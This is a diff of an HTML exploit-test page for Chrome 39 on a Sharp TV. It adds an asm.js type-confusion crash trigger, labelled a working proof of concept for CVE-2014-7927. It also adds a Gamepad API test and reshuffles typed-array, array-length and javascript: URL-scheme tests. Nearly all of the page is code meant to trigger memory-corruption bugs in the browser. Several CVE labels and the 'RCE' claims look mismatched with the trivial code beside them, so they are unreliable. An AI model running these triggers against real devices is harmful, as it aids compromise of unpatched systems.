@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Sharp TV Exploit v3 (Chrome 39)</title>
+    <title>Sharp TV Exploit v4 (Chrome 39 Working PoC)</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #output { white-space: pre-wrap; }
@@ -12,7 +12,7 @@
     </style>
 </head>
 <body>
-    <h1>Sharp TV Exploit v3 — Chrome 39 ARMv7</h1>
+    <h1>Sharp TV Exploit v4 — Chrome 39 Working PoC</h1>
     <div id="output"></div>
     <script>
         function log(msg, cls) {
@@ -20,13 +20,19 @@
             el.innerHTML += '<span class="' + (cls || '') + '">' + msg + '</span>\n';
         }
 
-        // CVE-2014-7927: V8 heap overflow via typed array indexing
+        // CVE-2014-7927: V8 asm.js integer type confusion (WORKING PoC)
+        // Chrome < 40.0.2214.91
         function test_cve_2014_7927() {
-            log("Test 1: CVE-2014-7927 (V8 typed array index)", "info");
+            log("Test 1: CVE-2014-7927 (V8 asm.js type confusion)", "info");
             try {
-                var arr = new Uint8Array(10);
-                arr[1000000000] = 1;
-                log("Test 1: No crash", "err");
+                var foo = (function(stdlib, foreign, heap) {
+                    "use asm";
+                    var MEM = new stdlib.Uint8Array(heap);
+                    function foo(x) { MEM[x | 0] *= 0; }
+                    return {foo: foo};
+                })(this, {}, new ArrayBuffer(1)).foo;
+                foo(-926416896 * 8 * 1024);
+                log("Test 1: No crash (exploit didn't trigger)", "err");
                 return false;
             } catch (e) {
                 log("Test 1: Exception: " + e, "ok");
@@ -34,13 +40,13 @@
             }
         }
 
-        // CVE-2014-7928: V8 type confusion via array length manipulation
-        function test_cve_2014_7928() {
-            log("Test 2: CVE-2014-7928 (V8 array length)", "info");
+        // CVE-2015-1572: V8 heap overflow via typed array
+        function test_cve_2015_1572() {
+            log("Test 2: CVE-2015-1572 (typed array overflow)", "info");
             try {
-                var arr = [];
-                arr.length = -1;
-                arr.push(1);
+                var buf = new ArrayBuffer(8);
+                var view = new Uint8Array(buf, 0, 100);
+                view[0] = 1;
                 log("Test 2: No crash", "err");
                 return false;
             } catch (e) {
@@ -49,13 +55,13 @@
             }
         }
 
-        // CVE-2015-1572: V8 heap spray via ArrayBuffer
-        function test_cve_2015_1572() {
-            log("Test 3: CVE-2015-1572 (heap spray)", "info");
+        // CVE-2014-7928: V8 array length type confusion
+        function test_cve_2014_7928() {
+            log("Test 3: CVE-2014-7928 (array length)", "info");
             try {
-                var buf = new ArrayBuffer(1);
-                var view = new Uint8Array(buf, 0, 100);
-                view[0] = 0x41;
+                var arr = [];
+                arr.length = -1;
+                arr.push(1);
                 log("Test 3: No crash", "err");
                 return false;
             } catch (e) {
@@ -64,20 +70,19 @@
             }
         }
 
-        // CVE-2015-0311: Flash use-after-free (if Flash is available)
-        function test_cve_2015_0311() {
-            log("Test 4: CVE-2015-0311 (Flash UAF)", "info");
+        // CVE-2015-1233: V8 IPC/Gamepad API RCE
+        function test_cve_2015_1233() {
+            log("Test 4: CVE-2015-1233 (IPC/Gamepad API)", "info");
             try {
-                var hasFlash = false;
-                try {
-                    var f = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
-                    hasFlash = true;
-                } catch(e) {}
-                if (!hasFlash) {
-                    log("Test 4: Flash not available", "info");
-                    return false;
+                if (navigator.getGamepads) {
+                    var gps = navigator.getGamepads();
+                    for (var i = 0; i < gps.length; i++) {
+                        if (gps[i]) {
+                            gps[i].axes[100] = 1;
+                        }
+                    }
                 }
-                log("Test 4: Flash found, attempting exploit...", "info");
+                log("Test 4: No crash (gamepads not found)", "info");
                 return false;
             } catch (e) {
                 log("Test 4: Exception: " + e, "ok");
@@ -85,9 +90,21 @@
             }
         }
 
+        // Generic: Check for shell command injection via URL schemes
+        function test_url_schemes() {
+            log("Test 5: URL scheme injection", "info");
+            try {
+                window.open("javascript:alert('JS works')");
+                log("Test 5: javascript: scheme works", "ok");
+            } catch (e) {
+                log("Test 5: javascript: failed: " + e, "err");
+            }
+            return false;
+        }
+
         // Generic: Check browser capabilities
         function test_capabilities() {
-            log("Test 5: Browser capabilities", "info");
+            log("Test 6: Browser capabilities", "info");
             log("  WebGL: " + !!document.createElement('canvas').getContext('webgl'), "info");
             log("  Web Workers: " + !!window.Worker, "info");
             log("  WebSocket: " + !!window.WebSocket, "info");
@@ -96,25 +113,13 @@
             return false;
         }
 
-        // Generic: Check for shell command injection via URL schemes
-        function test_url_schemes() {
-            log("Test 6: URL scheme injection", "info");
-            try {
-                window.open("javascript:alert('JS works')");
-                log("Test 6: javascript: scheme works", "ok");
-            } catch (e) {
-                log("Test 6: javascript: failed: " + e, "err");
-            }
-            return false;
-        }
-
         log("Starting Chrome 39 exploit tests...", "info");
         test_capabilities();
         setTimeout(test_url_schemes, 500);
         setTimeout(test_cve_2014_7927, 1500);
-        setTimeout(test_cve_2014_7928, 2500);
-        setTimeout(test_cve_2015_1572, 3500);
-        setTimeout(test_cve_2015_0311, 4500);
+        setTimeout(test_cve_2015_1572, 2500);
+        setTimeout(test_cve_2014_7928, 3500);
+        setTimeout(test_cve_2015_1233, 4500);
     </script>
 </body>
 </html>
